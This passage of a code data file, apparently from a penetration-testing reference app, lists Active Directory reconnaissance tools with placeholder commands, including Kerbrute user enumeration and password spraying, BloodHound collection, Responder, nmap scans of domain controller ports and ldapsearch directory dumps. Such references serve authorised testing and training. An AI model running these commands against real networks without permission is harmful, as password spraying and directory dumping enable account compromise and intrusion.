                ]
            }
        ],
        whatToLookFor: ['DC IPs', 'DNS Records', 'Site structure']
    },
    {
        id: 'users-groups',
        name: 'Users & Groups',
        icon: 'fa-users',
        description: 'Enumerate users and groups.',
        tools: [
            {
                name: 'Kerbrute',
                description: 'User Enumeration via Kerberos.',
                commands: [
                    { label: 'User Enum', code: './kerbrute userenum -d <DOMAIN> --dc <DC_IP> <USER_LIST>' },
                    { label: 'Password Spray', code: './kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> <USER_LIST> <PASS>' }
                ]
            },
            {
                name: 'Windapsearch',
                description: 'Search AD.',
                commands: [{label: 'Users', code: './windapsearch.py -d <DOMAIN> -u <USER> -p <PASS> --da'}]
            },
            {
                name: 'BloodHound',
                description: 'Ingestor.',
                commands: [{label: 'Run', code: 'bloodhound-python -d <DOMAIN> -u <USER> -p <PASS> -ns <DC_IP> -c all'}]
            }
        ],
        whatToLookFor: ['Domain Admins', 'Service Accounts', 'Active Users']
    },
    {
        id: 'trusts',
        name: 'Domain Trusts',
        icon: 'fa-handshake',
        description: 'Map trust relationships.',
        tools: [
            {
                name: 'PowerView',
                description: 'Get trusts.',
                commands: [{label: 'Get-DomainTrust', code: 'Get-DomainTrust'}]
            }
        ],
        whatToLookFor: ['Parent/Child trusts', 'Forest trusts']
    }
];

export const AD_RECON_TOPICS: AdReconTopic[] = [
    {
        id: 'passive',
        name: 'Passive Recon',
        icon: 'fa-user-secret',
        description: 'Listen to traffic.',
        tools: [
            {
                name: 'Wireshark',
                description: 'Packet analysis.',
                commands: [{label: 'Capture', code: 'wireshark'}]
            },
            {
                name: 'Responder (Analyze)',
                description: 'Analyze mode.',
                commands: [{label: 'Analyze', code: 'responder -I <INTERFACE> -A'}]
            }
        ],
        whatToLookFor: ['LLMNR/NBT-NS', 'SMB Broadcasts', 'Cleartext creds']
    },
    {
        id: 'active',
        name: 'Active Recon',
        icon: 'fa-radar',
        description: 'Probing the network.',
        tools: [
            {
                name: 'Nmap',
                description: 'Scanning.',
                commands: [{label: 'Scan', code: 'nmap -p 53,88,135,139,389,445,464,3268,3269 -sV <DC_IP>'}]
            }
        ],
        whatToLookFor: ['Open ports', 'Service versions']
    },
    {
        id: 'ldap-recon',
        name: 'LDAP Recon',
        icon: 'fa-address-book',
        description: 'Querying LDAP for information.',
        tools: [
            {
                name: 'Ldapsearch',
                description: 'Query LDAP.',
                commands: [
                    { label: 'Naming Contexts', code: 'ldapsearch -x -H ldap://<DC_IP> -s base namingContexts' },
                    { label: 'Anonymous Dump', code: 'ldapsearch -x -H ldap://<DC_IP> -b "DC=<DOMAIN>,DC=LOCAL"' },
                    { label: 'Auth Dump', code: 'ldapsearch -x -H ldap://<DC_IP> -D "<USER>@<DOMAIN>" -w <PASS> -b "DC=<DOMAIN>,DC=LOCAL"' }
                ]
            },
            {
                name: 'LDAPS (SSL)',
                description: 'Secure LDAP.',
                commands: [
                    { label: 'Check Cert', code: 'openssl s_client -connect <DC_IP>:636 -showcerts' },
                    { label: 'Ldapsearch SSL', code: 'ldapsearch -x -H ldaps://<DC_IP> -b "DC=<DOMAIN>,DC=LOCAL" -s sub' }
                ]
            },
            {
                name: 'Windapsearch',
                description: 'Enumeration tool.',
                commands: [
                    { label: 'Users', code: './windapsearch.py -d <DOMAIN> -u <USER> -p <PASS> --da' },
                    { label: 'Computers', code: './windapsearch.py -d <DOMAIN> -u <USER> -p <PASS> --computers' }
                ]
            }
        ],
        whatToLookFor: ['Naming Contexts', 'Users', 'Computers', 'Groups']
    }
];
